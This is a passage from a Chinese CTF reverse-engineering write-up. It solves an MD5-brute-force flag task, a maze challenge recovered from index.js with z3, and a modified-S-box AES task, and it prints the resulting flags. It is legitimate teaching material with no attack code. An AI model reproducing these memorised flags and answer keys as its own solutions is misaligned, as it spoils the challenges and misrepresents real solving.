class="string">&#x27;B250A0BC3A7F546D96070F719A72EBA5A0B571A46AB8BAFAE431C3715429A759202B1321BD675F8D653A0227084F929CB57CDF6934B8822DF6CA7A659863DC512A34974FF8BC231F38A8A62FA90D644CAC2FF9F52DB191A8D576D92DC6AC2E6932D5641DC13CECF52C90EDF4178B554CE46C3BB3DA29C07B39DF9273FCC9C2A86811222B643F129B95732A05D33F2E33F185ED077B868F622D7903AC80CEF5B2A00CF7E1C50E6327D16523EA5A1C020B32BA1FE5C722A56677EA5BE464AB8B60B6DF00DCF76D93EC2F2F680750E0D11A3FC64E2EC6BBAE0840D85B11B5DC15357F63493E5B9C0DFC0DB680B72B00EF3C0C2FEB864457749E5F1F8BA1C901F1D8F49282956F85D215221FF09FD1AB51399AB6C4DAFB388DE68C57195E94DA57CCF0B90A4A1782FCC54F4B5AA5F4E53EFA3A0AF4B48E7F25847590CD3587EBC3CE812B86C9167E85682DF1DB8E7415CF955107885E1BE937C95BBA61EB9F7BE48910F06ECD7571AD09745849A3F533837522951BE33C48055CADA86BFD41EBAFC60228C65ECF36AE50CE93F270889D3F4A9F86E76764B002960CAB9FEB4B034492DE6CF4CE324F4F38E25259CA954A11D830A27BD53AE611DA3A4A3361396526D278BCEDBDA58B2B874C95472502BA833DDCE46AAD67DD22B1BD2B7C53113CD923063D20BA28C82D8951576382A0C8A8DE2961C15351B0BC3704EEC9358AA8A266BA6F24B63F62416D1046CB061239D90EF9DC19A765B8C040BEF6999AAF0216374DA5754C424B1AF052DA38F36BA91ADCFA80B060B1FD737B78D9628326BF163371796F112FE9A7BB4646D68FF6217EFC6812866BFC51C9707A74BC8F6E0B86426F5CFDF74E2771FE37E6C86247FCD56CBA5CD9295A73AEC38FF0469532422DD0&#x27;</span></span><br><span class="line"></span><br><span class="line">c = [c[<span class="number">32</span>*i:<span class="number">32</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">32</span>)]</span><br><span class="line">m = [dec(k) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(m),<span class="number">4</span>):</span><br><span class="line">    flag += md5_bruteforce(m[i])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;W0w!y0u_@re_th3_BeSt_blasting_Exp3rt</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(md5_bruteforce(m[-<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># t!!&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;W0w!y0u_@re_th3_BeSt_blasting_Exp3rt!!&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="致我的星星"><a href="#致我的星星" class="headerlink" title="致我的星星"></a>致我的星星</h3><blockquote><p>做到这里应该有点小累了吧，wwzx和tx师傅想给大家打打气，不看html窝真的会伤心的</p><p>下载链接链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1IHyv4iy0NS1YeV0_EmXhYg?pwd=game">https://pan.baidu.com/s/1IHyv4iy0NS1YeV0_EmXhYg?pwd=game</a> 提取码: game</p></blockquote><p>审计 <code>index.js</code> 逻辑：</p><p><code>fl(e)</code> 中，按下一串大写字母字符串，md5为 <code>5c50152daeee511f32db7bf8a5502c69</code> 则正确。</p><p>先解方程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">a1,a2,a3,a4,a5,a6,a7,a8 = [Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">s.add(<span class="number">43654</span>*a1 - <span class="number">57003</span>*a2 -<span class="number">3158</span>*a3 + <span class="number">30120</span>*a4 -<span class="number">58621</span>*a5 -<span class="number">41947</span>*a6 +<span class="number">122237</span>*a7 +<span class="number">129534</span>*a8 == <span class="number">2594143</span>)</span><br><span class="line">s.add(-<span class="number">48022</span>*a1 + <span class="number">18308</span>*a2 + <span class="number">52478</span>*a3 + <span class="number">69397</span>*a4  +<span class="number">49696</span>*a5 + <span class="number">12288</span>*a6 -<span class="number">40437</span>*a7 -<span class="number">23154</span>*a8 ==  <span class="number">651137</span>)</span><br><span class="line">s.add(<span class="number">124109</span>*a1  +<span class="number">58952</span>*a2 + <span class="number">16645</span>*a3 -<span class="number">17531</span>*a4 + <span class="number">53139</span>*a5  +<span class="number">49937</span>*a6  + <span class="number">3282</span>*a7   +<span class="number">7656</span>*a8 == <span class="number">2071815</span>)</span><br><span class="line">s.add(<span class="number">108286</span>*a1 + <span class="number">118886</span>*a2 +<span class="number">116876</span>*a3   +<span class="number">2281</span>*a4 -<span class="number">64590</span>*a5  -<span class="number">3021</span>*a6 + <span class="number">13386</span>*a7 -<span class="number">56070</span>*a8 ==  <span class="number">703</span>)</span><br><span class="line">s.add(<span class="number">105983</span>*a1 + <span class="number">8794</span>*a2 + <span class="number">31851</span>*a3 -<span class="number">35052</span>*a4  -<span class="number">7880</span>*a5  + <span class="number">2183</span>*a6 + <span class="number">47575</span>*a7 +<span class="number">107236</span>*a8 == <span class="number">2511919</span>)</span><br><span class="line">s.add(-<span class="number">38005</span>*a1 -<span class="number">6833</span>*a2 +<span class="number">107897</span>*a3 +<span class="number">119771</span>*a4 +<span class="number">124322</span>*a5 + <span class="number">13335</span>*a6+ <span class="number">121590</span>*a7 -<span class="number">17434</span>*a8 == <span class="number">4816084</span>)</span><br><span class="line">s.add(<span class="number">60696</span>*a1 +<span class="number">95253</span>*a2 +<span class="number">101581</span>*a3 + <span class="number">93822</span>*a4 +<span class="number">112989</span>*a5  +<span class="number">65643</span>*a6  +<span class="number">45639</span>*a7 + <span class="number">26705</span>*a8 == <span class="number">5330538</span>)</span><br><span class="line">s.add(<span class="number">49019</span>*a1 +<span class="number">72343</span>*a2 -<span class="number">21814</span>*a3  +<span class="number">85020</span>*a4 -<span class="number">62332</span>*a5  +<span class="number">99828</span>*a6  +  <span class="number">587</span>*a7 -<span class="number">65119</span>*a8 ==  <span class="number">505173</span>)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">m = s.model()</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    res.append(m[<span class="built_in">eval</span>(<span class="string">f&#x27;a<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&#x27;</span>)].as_long())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [3, 4, 6, 8, 13, 13, 15, 15]</span></span><br></pre></td></tr></table></figure><p>对应S和Y的坐标：<code>S:(3,13) (8,13)</code> 和 <code>Y:(4,15) (6,15)</code>。</p><p>往下看，2轮（chance）对应2个迷宫，方向键为：上T下R左S右A，S和Y坐标分别对应每个迷宫的起点和终点，打印迷宫（10*20，补充一行）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">coordinates = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">11</span>], [<span class="number">1</span>, <span class="number">12</span>], [<span class="number">1</span>, <span class="number">13</span>], [<span class="number">1</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">2</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">4</span>], [<span class="number">2</span>, <span class="number">11</span>], [<span class="number">2</span>, <span class="number">12</span>], [<span class="number">2</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">4</span>], [<span class="number">3</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">5</span>, <span class="number">7</span>], [<span class="number">5</span>, <span class="number">8</span>], [<span class="number">5</span>, <span class="number">12</span>], [<span class="number">5</span>, <span class="number">14</span>], [<span class="number">5</span>, <span class="number">15</span>], [<span class="number">5</span>, <span class="number">18</span>],</span><br><span class="line">    [<span class="number">6</span>, <span class="number">1</span>], [<span class="number">6</span>, <span class="number">2</span>], [<span class="number">6</span>, <span class="number">4</span>], [<span class="number">6</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>], [<span class="number">6</span>, <span class="number">8</span>], [<span class="number">6</span>, <span class="number">11</span>], [<span class="number">6</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">7</span>, <span class="number">1</span>], [<span class="number">7</span>, <span class="number">5</span>], [<span class="number">7</span>, <span class="number">11</span>], [<span class="number">7</span>, <span class="number">12</span>], [<span class="number">7</span>, <span class="number">13</span>], [<span class="number">7</span>, <span class="number">14</span>], [<span class="number">7</span>, <span class="number">15</span>], [<span class="number">7</span>, <span class="number">16</span>],</span><br><span class="line">    [<span class="number">8</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">12</span>], [<span class="number">8</span>, <span class="number">13</span>], [<span class="number">8</span>, <span class="number">15</span>], [<span class="number">8</span>, <span class="number">18</span>],</span><br><span class="line">    [<span class="number">9</span>, <span class="number">3</span>], [<span class="number">9</span>, <span class="number">4</span>], [<span class="number">9</span>, <span class="number">6</span>], [<span class="number">9</span>, <span class="number">7</span>], [<span class="number">9</span>, <span class="number">8</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">cols = <span class="number">20</span></span><br><span class="line">rows = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (row,col) <span class="keyword">in</span> coordinates:</span><br><span class="line">    index = row * cols + col</span><br><span class="line">    data[index] = <span class="string">&#x27;*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># S:(3,13) (8,13)</span></span><br><span class="line"><span class="comment"># Y:(4,15) (6,15)</span></span><br><span class="line">data[(<span class="number">3</span>-<span class="number">1</span>)*cols+(<span class="number">13</span>-<span class="number">1</span>)] = data[(<span class="number">8</span>-<span class="number">1</span>)*cols+(<span class="number">13</span>-<span class="number">1</span>)] = <span class="string">&#x27;S&#x27;</span></span><br><span class="line">data[(<span class="number">4</span>-<span class="number">1</span>)*cols+(<span class="number">15</span>-<span class="number">1</span>)] = data[(<span class="number">6</span>-<span class="number">1</span>)*cols+(<span class="number">15</span>-<span class="number">1</span>)] = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(data[<span class="number">10</span>*i:<span class="number">10</span>*(i+<span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(data[<span class="number">10</span>*i:<span class="number">10</span>*(i+<span class="number">1</span>)]))</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">200</span><br><span class="line"></span><br><span class="line">##########</span><br><span class="line">##########</span><br><span class="line">##########</span><br><span class="line">#****#####</span><br><span class="line">#*##*#####</span><br><span class="line">#*S#*#####</span><br><span class="line">####*#####</span><br><span class="line">####Y#####</span><br><span class="line">##########</span><br><span class="line">##########</span><br><span class="line"></span><br><span class="line">#######**#</span><br><span class="line">##*#Y*##*#</span><br><span class="line">#**#**#**#</span><br><span class="line">#*###*####</span><br><span class="line">#*###*####</span><br><span class="line">#*S****###</span><br><span class="line">#*########</span><br><span class="line">##**#*##*#</span><br><span class="line">###**#***#</span><br><span class="line">##########</span><br></pre></td></tr></table></figure><p>第一轮（chance=0），从S到Y路径：STTAAARRRR</p><p>第二轮（chance=1），从S到Y路径：AAATTTTS</p><p>连起来，加flag壳，得到：<code>SYC&#123;STTAAARRRRAAATTTTS&#125;</code>。</p><p>​</p><h3 id="AES"><a href="#AES" class="headerlink" title="AES!"></a>AES!</h3><blockquote><p>Am1re说AES一学一个不吱声</p></blockquote><p>提取出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key = b&#x27;SYCLOVERSYCLOVER&#x27;</span><br><span class="line">c = [0x99, 0xE8, 0xB8, 0x01, 0xC8, 0x82, 0x51, 0x93, 0x12, 0xEE, </span><br><span class="line">  0x89, 0x64, 0xE7, 0xEF, 0x63, 0x8D, 0x51, 0xDF, 0x5D, 0x78, </span><br><span class="line">  0x39, 0xAA, 0x39, 0x62, 0xA0, 0xB4, 0x50, 0x30, 0x47, 0x30, </span><br><span class="line">  0x21, 0x06]</span><br></pre></td></tr></table></figure><p>更改了AES的S盒，拿AES源码修改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span 